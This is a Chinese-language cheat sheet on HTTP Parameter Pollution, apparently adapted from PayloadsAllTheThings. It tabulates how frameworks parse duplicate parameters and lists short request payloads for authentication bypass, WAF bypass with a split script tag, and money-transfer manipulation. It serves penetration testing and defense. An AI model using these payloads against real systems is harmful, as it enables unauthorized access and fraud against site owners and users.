# HTTP Parameter Pollution - HTTP参数污染

[SEARCH_KEYWORDS]
漏洞类型: HTTP Parameter Pollution HPP 参数污染 参数重复
攻击类型: WAF Bypass Logic Bypass Authorization Bypass
关键词: parameter duplicate pollution multiple same name value
技术: Duplicate Parameters Array Injection Nested Injection JSON Injection
编码: URL Encode Double Encode

[CONTENT]

## HTTP参数污染概述

HTTP参数污染(HPP)是一种Web攻击规避技术，允许攻击者构造HTTP请求来操纵Web逻辑或检索隐藏信息。这种技术基于在多个同名参数实例之间分割攻击向量。

## 攻击层次

- **客户端HPP**：利用浏览器中运行的JavaScript代码
- **服务端HPP**：利用服务器处理同名参数的方式

## 参数解析表

当 `?par1=a&par1=b` 时：

| 技术 | 解析结果 | 值 |
|------|----------|-----|
| ASP.NET/IIS | 所有出现 | a,b |
| ASP/IIS | 所有出现 | a,b |
| Golang (Query().Get) | 第一个 | a |
| Golang (Query()[...]) | 数组 | ['a','b'] |
| JSP/Servlet/Tomcat | 第一个 | a |
| mod_wsgi/Python/Apache | 第一个 | a |
| Node.js | 所有出现 | a,b |
| Perl CGI/Apache | 第一个 | a |
| PHP/Apache | 最后一个 | b |
| PHP/Zeus | 最后一个 | b |
| Python Django | 最后一个 | b |
| Python Flask | 第一个 | a |
| Python/Zope | 数组 | ['a','b'] |
| Ruby on Rails | 最后一个 | b |
| IBM HTTP Server | 第一个 | a |

## Payload类型

### 重复参数

```powershell
/app?debug=false&debug=true
/transfer?amount=1&amount=5000
param=value1&param=value2
```

### 数组注入

```powershell
param[]=value1
param[]=value1&param[]=value2
param[]=value1&param=value2
param=value1&param[]=value2
```

### 编码注入

```powershell
param=value1%26other=value2
```

### 嵌套注入

```powershell
param[key1]=value1&param[key2]=value2
```

### JSON注入

```json
{
    "test": "user",
    "test": "admin"
}
```

## 攻击示例

### 绕过认证

```powershell
/login?user=admin&user=guest
# PHP取最后一个值：user=guest
```

### WAF绕过

```powershell
/search?q=<script>&q=alert(1)
# 某些WAF只检查第一个参数
```

### 业务逻辑操纵

```powershell
/transfer?to=attacker&to=victim&amount=1000
# 取决于后端处理逻辑
```

## 工具

- Burp Suite - 手动修改请求测试重复参数
- OWASP ZAP - 拦截和操纵HTTP参数

## 参考文档

原始来源: PayloadsAllTheThings/HTTP Parameter Pollution/README.md